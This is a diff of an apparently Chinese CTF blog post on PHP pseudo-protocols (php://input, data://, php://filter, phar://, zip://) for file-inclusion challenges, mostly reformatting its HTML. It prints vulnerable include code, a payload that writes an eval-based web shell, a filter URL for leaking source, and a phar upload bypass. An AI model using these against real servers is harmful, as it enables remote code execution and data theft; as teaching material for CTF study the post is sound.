@@ -58,51 +58,75 @@
   </div>
 
   <!-- 文章目录 -->
-  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php-input"><span class="toc-text">php:&#x2F;&#x2F;input</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-绕过file-get-contents内容检查"><span class="toc-text">1.绕过file_get_contents内容检查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-通过include实现代码执行"><span class="toc-text">2.通过include实现代码执行</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#data"><span class="toc-text">data:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过file-get-contents内容检查"><span class="toc-text">绕过file_get_contents内容检查</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php-filter"><span class="toc-text">php:&#x2F;&#x2F;filter</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#convert-base64-encode"><span class="toc-text">convert.base64-encode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phar"><span class="toc-text">phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#zip"><span class="toc-text">zip:&#x2F;&#x2F;</span></a></li></ol>
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#"><span class="toc-text">php:&#x2F;&#x2F;input</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-绕过file-get-contents内容检查"><span class="toc-text">1.绕过file_get_contents内容检查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-通过include实现代码执行"><span class="toc-text">2.通过include实现代码执行</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#"><span class="toc-text">data:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过file-get-contents内容检查"><span class="toc-text">绕过file_get_contents内容检查</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#"><span class="toc-text">php:&#x2F;&#x2F;filter</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#convert-base64-encode"><span class="toc-text">convert.base64-encode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#"><span class="toc-text">phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#"><span class="toc-text">zip:&#x2F;&#x2F;</span></a></li></ol>
 
   <div class="post-content">
     <p>打ctf的时候发现很多时候都要用到php伪协议，所以整理一下</p>
-<h1 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h1><blockquote>
+<h1>php://input</h1>
+<blockquote>
 <p>enctype=”multipart/form-data” 的时候 php://input 是无效的</p>
 </blockquote>
 <p>使用条件:allow_url_include:On</p>
 <p>php://input 是个可以访问请求的原始数据的只读流,可以让本来的get参数从post获得数据</p>
 <p>使用的时候不要把数据包中的GET改成POST，直接在下面空一行填参数内容内容即可(不要加参数名=)</p>
-<h2 id="1-绕过file-get-contents内容检查"><a href="#1-绕过file-get-contents内容检查" class="headerlink" title="1.绕过file_get_contents内容检查"></a>1.绕过file_get_contents内容检查</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(file_get_contents($_GET[<span class="string">'a'</span>],<span class="string">'r'</span>)==<span class="string">'get flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'success!'</span>.<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'wrong file!'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="1-绕过file-get-contents内容检查">1.绕过file_get_contents内容检查</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(file_get_contents($_GET[<span class="string">'a'</span>],<span class="string">'r'</span>)==<span class="string">'get flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'success!'</span>.<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'wrong file!'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>我们不知道哪个文件的内容是getflag,但file_get_contents的第一个参数不一定是文件名，也可以是一个url或者伪协议</p>
 <p>因此可以访问?a=php://input并添加get flag在http包中，拿到flag</p>
-<h2 id="2-通过include实现代码执行"><a href="#2-通过include实现代码执行" class="headerlink" title="2.通过include实现代码执行"></a>2.通过include实现代码执行</h2><p>test.php内容如下</p>
+<h2 id="2-通过include实现代码执行">2.通过include实现代码执行</h2>
+<p>test.php内容如下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>可以通过php://input实现代码执行</p>
-<p>访问/test.php?a=php://input<br>用bp截包后在下面加上</p>
+<p>访问/test.php?a=php://input<br>
+用bp截包后在下面加上</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">'123'</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>可以看到输出了123,<br>这种情况我们可以尝试直接写个shell</p>
+<p>可以看到输出了123,<br>
+这种情况我们可以尝试直接写个shell</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">"a.php"</span>,<span class="string">"w"</span>),<span class="string">'&lt;?php eval($_POST["a"]);?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h1 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h1><p>使用条件:<br>allow_url_fopen,allow_url_include 均为on</p>
-<h2 id="绕过file-get-contents内容检查"><a href="#绕过file-get-contents内容检查" class="headerlink" title="绕过file_get_contents内容检查"></a>绕过file_get_contents内容检查</h2><p>data://同样可以用来绕过file_get_contents的内容检查,<br>还是这段代码</p>
+<h1>data://</h1>
+<p>使用条件:<br>
+allow_url_fopen,allow_url_include 均为on</p>
+<h2 id="绕过file-get-contents内容检查">绕过file_get_contents内容检查</h2>
+<p>data://同样可以用来绕过file_get_contents的内容检查,<br>
+还是这段代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(file_get_contents($_GET[<span class="string">'a'</span>],<span class="string">'r'</span>)==<span class="string">'get flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'success!'</span>.<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'wrong file!'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>可以用<br>?a=data:text/plain,get flag<br>或a=data://text/plain,get flag<br>或a=data:text/plain,get flag<br>拿到flag,<br>也可以使用base64编码:<br>a=data:text/plain;base64,Z2V0IGZsYWc=</p>
-<h1 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h1><blockquote>
+<p>可以用<br>
+?a=data:text/plain,get flag<br>
+或a=data://text/plain,get flag<br>
+或a=data:text/plain,get flag<br>
+拿到flag,<br>
+也可以使用base64编码:<br>
+a=data:text/plain;base64,Z2V0IGZsYWc=</p>
+<h1>php://filter</h1>
+<blockquote>
 <p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用</p>
 </blockquote>
 <p>使用条件:</p>
-<p>allow_url_fopen:On/Off<br>allow_url_include:On/Off ，On时可以远程包含文件</p>
+<p>allow_url_fopen:On/Off<br>
+allow_url_include:On/Off ，On时可以远程包含文件</p>
 <p><img src="/images/filter.png" alt=""></p>
-<h2 id="convert-base64-encode"><a href="#convert-base64-encode" class="headerlink" title="convert.base64-encode"></a>convert.base64-encode</h2><ul>
+<h2 id="convert-base64-encode">convert.base64-encode</h2>
+<ul>
 <li>convert.base64-encode过滤器常用于配合include读取源代码</li>
 </ul>
 <p>还是这段代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>如果直接包含flag.php的话是读不到源代码的,但我们可以访问</p>
-<p>?a=php://filter/convert.base64-encode/resource=flag.php<br>得到flag.php base64编码后的源代码</p>
-<h1 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h1><blockquote>
+<p>?a=php://filter/convert.base64-encode/resource=flag.php<br>
+得到flag.php base64编码后的源代码</p>
+<h1>phar://</h1>
+<blockquote>
 <p>该协议可以配合文件包含漏洞绕过文件上传类型的限制</p>
 </blockquote>
 <p>使用条件：</p>
-<p>allow_url_fopen:On/Off<br>allow_url_include:On/Off</p>
+<p>allow_url_fopen:On/Off<br>
+allow_url_include:On/Off</p>
 <p>比如只允许上传jpg格式的文件，可以先在shell.txt中写入shell的内容，打包成a.zip，将a.zip改名成a.jpg上传，然后用</p>
 <p>?file=phar://a.jpg/shell.txt来执行shell</p>
-<h1 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h1><p>使用条件:<br>allow_url_fopen:On/Off<br>allow_url_include:On/Off</p>
+<h1>zip://</h1>
+<p>使用条件:<br>
+allow_url_fopen:On/Off<br>
+allow_url_include:On/Off</p>
 <p>与phar://类似</p>
 
   </div>
